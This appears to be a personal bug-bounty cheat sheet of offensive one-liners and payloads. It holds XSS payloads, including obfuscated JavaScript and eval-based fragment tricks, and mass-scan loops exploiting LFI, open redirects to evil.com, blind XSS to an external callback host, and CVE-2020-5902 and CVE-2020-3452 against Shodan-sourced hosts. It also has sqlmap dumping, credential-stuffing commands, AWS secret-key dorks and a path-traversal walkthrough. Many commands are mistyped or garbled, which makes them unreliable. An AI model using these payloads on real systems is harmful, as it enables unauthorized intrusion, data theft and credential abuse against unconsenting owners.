<?xml version="1.0" ?>
<someElement>
	<a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(1)'/></a>
</someElement>

URI Schemes
<iframe src="javascript:alert(1)"></iframe>
<iframe src="vbscript:msgbox(1)"></iframe> (IE)
<iframe src="data:text/html,<script>alert(0)</script>"></iframe> (Firefox, Chrome, Safari)
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe> (Firefox, Chrome, Safari)

HTTP Parameter Pollution
http://target.com/something.xxx?a=val1&a=val2
ASP.NET 	a = val1,val2
ASP 		a = val1,val2
JSP 		a = val1
PHP 		a = val2

Two Stage XSS via fragment identifier (bypass length restrictions / avoid server logging)
<script>eval(location.hash.slice(1))</script>
<script>eval(location.hash)</script> (Firefox)

http://target.com/something.jsp?inject=<script>eval(location.hash.slice(1))</script>#alert(1)

Two Stage XSS via name attribute
<iframe src="http://target.com/something.jsp?inject=<script>eval(name)</script>" name="alert(1)"></iframe>

Non-alphanumeric crazyness...
<script>
$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();
</script>




chat gpt for bountities
 to use bruteforce enumerartion with amass to list ip addresses
 
 
 
 


Bash
amass intel brute -w /path/to/wordlist.txt -d example.com

amass intel brute -min-for-brute 3 -w /path/to/wordlist.txt -d example.com

  amass + nuclei
  amass intel -d "$domain" > subdomain.txt
amass intel brute -w /path/to/wordlist.txt -d example.com > subdomain.txt
nuclei -t templates/subdomain-takeover.yaml -1 subdomains.txt

 sudomain with jsubfinder + httpx
 jsubfinder -d example.com
 httpx -follow-redirects -threads 100 -timeout 5s -c 200 -silent -o results.txt subdomains.txt            for live subdomain
 
 
 using FFuf to finding RCE
 ffuf -w payloads.txt -u http://example.com/path/q-FUZZ 
 ffuf -w payloads.txt -u http://example.com/path/q-FUZZ -c 200,204,301,302

 ffuf -w payloads.txt -u http://example.com/path/q-FUZZ -c 200,204,301,302 -cs "command excuted successfully"
 
   full account takeover techniques in API/register
   
   using subjs , anew, and httpx to search for js domain
   subjs -silent  threads 10 -source  anew  example.com |  anew |  httpx  -silent threads 10   -status-code  200
   
   using shodan and nuclei to scanning host
   
   shodan search --flieds ip_str product organization country --separator, "product apache" | awk -F, "{print $1}" | nucliei -t templetes/http-vulns.yml -1
   
   using gospider, assetfinder , amass and nuclei
   
   amass enum -passive -d example.com -o amass_output.txt && gospider -S targets.txt -q -o gospider_output.txt && cat gospider_output.txt | awk -F '[/:]' '{print $4}' | sort -u | assetfinder -subs-only | sort -u | nuclei -t -t templates/subdomain-takeover.yaml -1 -o nuclei_results.txt
   
   
   search for SSRf using subfinder, httpx and qsreplace
   subfinder -d example.com | qsreplace 'http://localhost' 'fuzz' | httpx -silent - threads 10 -status-code 200
   
   
   using chaos, gospider, findomain, assetfinder, amass, httpx and anew for recon domain
   
   chaos -d example.com | gospider -s https://example.com | findomain -t example.com | assetfinder | amass intel -d example.com | hpptx -silent -thread 10 -status code 200 | anew | sort -u 
   
   
    ONELINER-SCRIPT-FOR-BUG-BOUNTY                  ONELINER-SCRIPT-FOR-BUG-BOUNTY                ONELINER-SCRIPT-FOR-BUG-BOUNTY
   
   
   onliner search for xss using kxss, xargs and httpx
   
   kxss example.com | xargs -1 % sh -c " echo '<script> alert(1)</script>' | httpx - silent -body-string @- -status-code 200 %"
   
   onliner find xss using subfindeer,httpx,katana,gxss, kxss,nad dalfox
   subfinder -d example.com | httpx -silent -threads 10 -status-code 200 | katana -query-params | gxss |kxss | dalfox pipe
   
   domian eneumeration and discovery files using ffuf, httpx, and findomain
   ffuf -w /path/to/wordlist -u https://target/FUZZ -e .html, php -mc all -mc 200, 204,301,307 -o output.txt -of json -sc 200 -t 100 -timeout 20s
   
   oneliner  find open redirct unsing waybackurls, httpx,gf, anew and nuclei
   waybackurls target.com | httpx- silent |grep "location" | anew | nuclei -t /path/to/open-redirect-templetes-silent
   
   gf openredirct target.com | anew | nuclei -t /path/to/open-redirect-templetes-silent
   
   
   online to complet numeration of xss, lfi, ssrf in domain using gauplus, anwe,gxss,gf , httpx, and secretfindeer
   gau target.com | plus | anew | gxss -xss | gf -lfi -ssrf | qsreplace -r target.com -s target.com | httpx - silent | secretfinder -silent
   
   oneliner check cloudfarebusing subfinder, dnsx, cf-check, naabu
   subfinder -d target.com -silent | dnsx-silent | cf -check | naabu -silent
   
   onliner recon subdomian using assetfinder, httpx,xargs, waybackurls and nuclie vulnerbiltiy scan
   assetfinder target.com | httpx -silent | xargs -1 {} sh -c 'waybackurls {} | nuclei -t /path/to/vunearblity-templates - silent'
   
   oneliner extract js using haktrails, httpx, getjs, anew, tojson
   hactrails target.com | httpx -title -follow-redirects -silent-content-length-threads 100 -timeout 20s -retries 3 -o output.txt -mc all -mc 200,204,302,307 -wl /path/to/wordlist  -ac -acme-dns -acme-dns-timeout 10s -acme-dns-challage dns-01 -acme-dns-credentails "/path/to/credentails json" |getjs -silent | anew | tojson
   
   
   oneliner LFI using gau, gf, qsreplace and xargs
   
   gau target.com | gf lfi | qsreplace -r target..com -s target.com | xargs -1 {} sh -c 'curl -s {} | grep -i  "root:x:0:0:root:/root:/bin/bash"
   
   
   
   

  Open Redirect Oneliner:
cat waybackurls_result.txt|grep -a -i \=http|qsreplace 'http://evil.com'|while read host do;do curl -s -L $host -I|grep "evil.com" && echo "$host \033[0;31m[+]VULNERABLE-TO-OPEN-REDIRECT-ATTACK\n";done
  
 
 Blind XSS Oneliner:
echo testphp.vulnweb.com|gau -subs|grep "https://" |grep -v "png\|jpg\|css\|js\|gif\|txt"|grep "="|uro|dalfox pipe --deep-domxss --multicast --blind akshayravi0479.xss.ht


Content Discovery With Dirsearch Oneliner:
dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json -u http://target

 SQLI Oneliner With Sqlmap:
1 subfinder -d target.com|tee -a domains.txt
2 cat domains.txt|httpx|tee -a urls-alive.txt
3 cat urls-alive.txt|waybackurls|tee -a urls-check.txt
4 gf sqli urls-check.txt >> sql.url
5 sqlmap -m sql.url --dbs --batch

  


XSS Scanner
echo https://target.com | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq

gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt

waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt

cat HOSTS.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"

XSS Payloads:
xss%27;eval.call`${%27alert\x28window.origin\x29%27}`;//
"/><details/open/ontoggle=promt(1)>

"onfocus="alert(1)"autofocus="abc
      

                 
    LOCAL FILL INCLUSION
   gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
   
   Open-redirect
   export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
   cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
   
   
   Prototype Pollution
   subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
   
   CVE-2020-5902    CVE-2020-5902       CVE-2020-5902
   shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
   
   
   CVE-2020-3452       CVE-2020-3452      CVE-2020-3452
   while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt
   
   CVE-2022-0378    CVE-2022-0378    CVE-2022-0378
   
   cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
   
   
   
   FIND JAVASCRIPT FILES     FIND JAVASCRIPT FILES    FIND JAVASCRIPT FILES
   
   assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done
   
   EXTRACT ENDPOINTS FROM JAVASCRIPT   
   cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u

   
   
   Subdomain Bruteforcer with FFUF
   ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep "| URL |" | awk '{print $4}'
   
   Extract IPs from a File
   grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt
   
   Create Custom Wordlists
   gau HOST | unfurl -u keys | tee -a FILE1.txt; gau HOST | unfurl -u paths | tee -a FILE2.txt; sed 's#/#\n#g' FILE2.txt | sort -u | tee -a FILE1.txt | sort -u; rm FILE2.txt  | sed -i -e 's/\.css\|\.png\|\.jpeg\|\.jpg\|\.svg\|\.gif\|\.wolf\|\.bmp//g' FILE1.txt
   
   cat HOSTS.txt | httprobe | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a FILE.txt  
   
   

    
    Find Subdomains TakeOver
    subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
    
    
    Dump Custom URLs from ParamSpider
    
    cat HOSTS.txt | xargs -I % python3 paramspider.py -l high -o ./OUT/% -d %;
    
    
    EXTRACT ENDPOINTS FROM SWAGGER.JSON
    curl -s https://HOST/v2/swagger.json | jq '.paths | keys[]'
    
    
    CORS Misconfiguration
    site="URL"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on "$url"; fi; done
    
    
    Find Hidden Servers and/or Admin Panels
    
    ffuf -c -u URL -H "Host: FUZZ" -w FILE.txt 
    
    
    COMMAND THAT (TO BE EXECUTED ONCE A MONTH -MORE OR LESS
    
    today=$(date '+%Y-%m-%d'); cat subdomains.txt | httpx -follow-redirects -json -silent | tee active_subdomains_$today.json | jq -r '[.url,.content_length,.title,.host,.status_code] | @csv' | tee urls_modified_raw_$today.csv | anew -d urls_modified_raw_old.csv | cut -d',' -f1 | sed 's/"//g' | ./program active_subdomains_clean_$today.csv active_subdomains_clean_old.csv | tee urls_modified_clean_$today.txt | nuclei -silent -exclude-severity info,low | tee nuclei_urls_modified_$today.txt | notify; cp urls_modified_raw_{$today,old}.csv


   

         MASS-HUNTING-FOR-LEAKED-SENSITIVE-DOCUMENTS-FOR-BIG-BOUNTIES      MASS-HUNTING-FOR-LEAKED-SENSITIVE-DOCUMENTS-FOR-BIG-BOUNTIES
         https://infosecwriteups.com/mass-hunting-for-leaked-sensitive-documents-for-big-bounties-722cdd5ac3bb
         
         curl -s https://raw.githubusercontent.com/projectdiscovery/public-bugbounty-programs/main/chaos-bugbounty-list.json | jq ".[][] | select(.bounty==true) | .domains[]" -r > targets.txt                                                    
                                                      | 
         This bash one-liner will curl a public bug bounty program list, filter programs which include bounty, select only domains from parameters and saves the output into targets.txt file
       
          or you can use this  https://github.com/sw33tLie/bbscope
    Hackerone  
  bbscope h1 -a -u <username> -t <token> -b > bbscope-h1.txt
  
  Bugcrowd
  bbscope bc -t <token> -b > bbscope-bc.txt
  
  Note: Manually inspect all findings and add them to targets.txt for the domains without wildcards, and to the targets-wildcards.txt — domains with wildcards.
  
  curl -s "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/domains.txt" | anew targets.txt

curl -s "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/wildcards.txt" | anew target-wildcards.txt
  
  

   sudo apt-get install poppler-utils

  [{
  "command":"for i in `cat input | gau --subs --threads 16 | grep -Ea '\\.pdf' | httpx -silent -mc 200`; do if curl -s \"$i\" | pdftotext -q - - | grep -Eaiq 'internal use only|confidential'; then echo $i | tee output; fi; done", "ext":"txt" 
}]

  axiom-scan targets-wildcards.txt -m gau-pdfs -anew pdf-leak-findings.txt
  If you want to use it on targets without subdomains included, it is required to modify the module by removing -subs flag:
  [{
  "command":"for i in `cat input | gau --threads 16 | grep -Ea '\\.pdf' | httpx -silent -mc 200`; do if curl -s \"$i\" | pdftotext -q - - | grep -Eaiq 'internal use only|confidential'; then echo $i | tee output; fi; done", "ext":"txt"
}]

  ~/.axiom/modules/gau-pdfs.json
  axiom-scan targets.txt -m gau-pdfs -anew pdf-leak-findings.txt
  
  
 
  AWS  AND CLOUD TOOLS
  https://github.com/mosesrenegade/PMapper
  For Amazon S3 buckets, try the “AWSBucketDump” tool by Jordan Potti  https://github.com/jordanpotti/AWSBucketDump 
For DigitalOcean Spaces, try the “Spaces-Finder” tool by Appsecco: https://github.com/appsecco/spaces-finder 

For GCP Storage, try the “GCPBucketBrute” tool by RhinoSecurityLabs:   https://github.com/RhinoSecurityLabs/GCPBucketBrute

 For Azure Storage, try the “MicroBurst” tool by NetSPI: https://github.com/NetSPI/MicroBurst 
  
  
  
  
  AWS S3 CLI Cheat sheet
  check this write-up     https://infosecwriteups.com/mass-hunting-for-misconfigured-s3-buckets-99e5f158cdc0
  Listing objects in S3 bucket:     aws s3 ls s3://bucket-name
  Uploading an Object : aws s3 cp /path/to/local/file s3://bucket-name/path/to/s3/key
   Downloading an Object:  aws s3 cp s3://bucket-name/path/to/s3/key /path/to/local/file
   Removing an Object: aws s3 rm s3://bucket-name/path/to/s3/key

  curl -s https://raw.githubusercontent.com/projectdiscovery/public-bugbounty-programs/main/chaos-bugbounty-list.json | jq ".programs[] | select(.bounty==true) | .name,.domains[]" -r > base_wordlist.txt
  Also, it is required to format base wordlist to remove special and uppercase characters:
  cat base_wordlist.txt | tr '[:upper:]' '[:lower:]' | sed "s/[^[:alnum:].-]//g" | sort -u > tmp
mv tmp base_wordlist.txt
    
    https://github.com/nahamsec/lazys3.git
  
  
  A quick way to scan for the s3 bucket list:
s3scanner -bucket-file s3-buckets.txt -threads 16 | grep -aE 'Read|Write|Full' | tee results.txt




     𝗔𝗪𝗦 𝗢𝗦𝗜𝗡𝗧 𝗯𝘆 𝗗𝗼𝗿𝗸𝗶𝗻𝗴 🎩

=Shodan Dorks
html:"AWS_ACCESS_KEY_ID"
html:"AWS_SECRET_ACCESS_KEY"
html:"AWS_SESSION_TOKEN"
title:"AWS S3 Explorer"
html:"AWS Elastic Beanstalk overview"
html:"OpenSearch Dashboards"
"X-Amz-Server-Side-Encryption"


    Example Google Dorking Syntax
site:websitename.com inurl:".s3.amazonaws.com"

site:websitename.com inurl:"storage.googleapis.com"

 AWS Access Key 

 ./enumerate-iam.py — access-key AKIA… — secret-key StF0q…
 
 
 credentail-stuffing-in clound-services
 nuclei -t credential-stuffing/self-hosted/gradana.yaml -uncover -uncover-limit 500 -var username -var password=admin
 
 nuclei -u https://jira.projectdiscovery.io/ -t jira.yaml -var username=testing@projectdiscovery.io -var password=test123 
 cat jira_host.txt | nuclei -var username=email.txt -var password=pass.txt -t jira.yaml -attack-type clusterbomb


  tip  tip
   /aws-s3-bucket-versioning-discloses-secrets-      in web app                       https://osintteam.blog/aws-s3-bucket-versioning-discloses-secrets-1d63fbe498ab
   
     nmap -sVC -p- -T4 16.171.123.169 -vv
         aws s3 ls s3://<BUCKET_NAME> --no-sign-request [Anonymous Access]
         aws s3api list-object-versions --bucket huge-logistics-dashboard --query "Versions[?VersionId!='null']" --no-sign-request
         aws s3api get-object --bucket huge-logistics-dashboard --key "static/js/auth.js" --version-id "qgWpDiIwY05TGdUvTnGJSH49frH_7.yh" old_auth.js --no-sign-request
         aws configure
aws sts get-caller-identity [Checking Identity]



      LLM HACKING       LLM HACKING        LLM HACKING

 






   tip tip
   1 Discovered dead subdomains? Save them to a file, collect the IPs of live subdomains and use VhostFinder to enumerate virtual hosts. This can help expand the attack surface!
    smart.facebook.com    ->>  dead subdomain
    business.facebook.com    ->>  alive subdomain with 8.68.8.8 as ip
    
    vhostfinder ip 8.86.8.8  -wordlist deaddobdomain.com
    
   2) Found an obscure subdomain pointing you to a login page? Try to make a POST request to a register endpoint. Perhaps they forgot to disable it and you may be able to use this to continue testing! 
   
   3️⃣ Found a target that is using Akamai as a CDN and doesn’t have a login functionality? Sometimes you can perform cache poisoning by adding illegal headers! 
   request
   Get /admin?bustcache= always  http 1:1
   host: smart.com
   ::\
   reponse
   http/2 400 bad request
   how akamia should cach it 
   server-timing: cdn-cache; desc = HIT
   
 4 Find blind XSS whilst hunting by changing your User-Agent to an XSS payload using a match/replace rule in Burpsuite. If you’re lucky, you get a pingback someday!



    tip on find critical vulnerability
 1 I went to Shodan (or easy searching with http://certs.io)

Searched for my target with the filter:

> ssl.cert.subject\.cn:*.example[.]com

I found a server with a certificate for:

*.apps.███\.com

If I see wildcards, I think that the server is an ingress endpoint 
 
$ curl https://██ -H "Host: invalid12345.apps.███\.com"

Response:

> 404 Not Found: Requested route ('invalid12345.apps.███\.com') does not exist.

I brute-forced the host header with ffuf:

$ ffuf -u https://██ -H "Host: FUZZ.apps.███\.com" -mc all -fw 9

 And lots of results.

After filtering through them, I came across this:

spl-api.apps.███\.com

What's on this host? Time to try to find endpoints on this API.

$ ffuf -u https://LOADBALANCER/FUZZ -H "spl-api.apps.███\.com" -mc 200

I found the endpoint  "/v2/api-docs" which responded with an OpenAPI specification.

These contain API routes definitions:

• Where they are.
• What they accept (HTTP method, params)
 One endpoint stuck out:

"/spl/api/teardown/file"

It accepted a query parameter: "fileName".

Let's see if it's vulnerable to file disclosure?

$ curl "https://LOADBALANCER/spl/api/teardown/file?fileName=/etc/passwd" -H "spl-api.apps.███\.com"

Response:

> File not found


What if I tried traversing back with "../"

The app might be joining paths like:

> path.Join("/documents", fileName);

Let's try it:

$ curl "https://LOADBALANCER/spl/api/teardown/file?fileName=../../../../../etc/passwd" -H "spl-api.apps.███\.com"

8/ It worked!

The application responded with the contents of /etc/passwd

An easy path traversal just by finding attack surface others hadn't.


• Found a server that had a wildcard certificate
• Brute-forced Host headers with FFUF
• Found an API, then found /v2/api-docs
• Discovered an endpoint that had a parameter "fileName"
• Tried path traversal and it worked.


      art-of-monitoring-bug-bounty-programs
        
        
        
        
        First off all, is portscan in scope? If yes, portscan
Look for webservers
Try to find subdomains 
Try to find other webservers on said server
Try to do content discovery
Try to do dorking on found from before
Try to find anything on github related
Try to take screenshots with something like aquatone
Try to look at any kind of custom login pages, try content discovery more
Try to look for any register on site and IDOR
Try to look for XSS by having '"><img src=x>${{7*2}} at the very least in every field where possible
Try to look for SQLi with same and looking out of SQL errors
You can use these to fuzz the fu--ers
Try to check all CSRF tokens on forms where they need be or generally set and verify it is checked
Change GET to POST and reverse or try PUT or DELETE on endpoint
NoSQLi? XXE? 
Any open redirects? 
Throw some LFI and RFI in the mix! 
And the best of all? Business logic! 

Found an API?! YES! LETS GO!! 
Stay tuned for my API hacking post and let me know what I missed <3
        
        
        
        EXCEPT   EXCEPT                              TRY SQL ,XSS,SSRF ON THIS HEADERS
        
        
        "Cookie": "test{payload}",
"User-Agent": "test{payload}",
"Location": "test{payload}",
"Origin": "test{payload}",
"Referer": "test{payload}",
"Profile": "test{payload}",
"X-Host": "test{payload}",
"Via": "test{payload}",
"True-Client-IP": "test{payload}",
"X-Forwarded-For": "test{payload}",
"Forwarded": "for=spoofed;{payload}",
"X-Wap-Profile": "test{payload}",
"Destination": "test{payload}",
"Contact": "test{payload}",
"X-Originating-IP": "test{payload}",
"X-Original-URL": "test{payload}",
"Client-IP": "test{payload}",
"X-HTTP-DestinationURL": "test{payload}",
"API-Version": "test{payload}",
"Proxy": "test{payload}",
"Referrer": "test{payload}",
"CF-Connecting_IP": "test{payload}",
"X-Forwarded-Proto": "test{payload}",
"Proxy-Host": "test{payload}",
"From": "test{payload}",
"Client-IP": "test{payload}",
"X-Forwarded-Server": "test{payload}",
"X-Arbitrary": "test{payload}",
"X-Real-IP": "test{payload}"
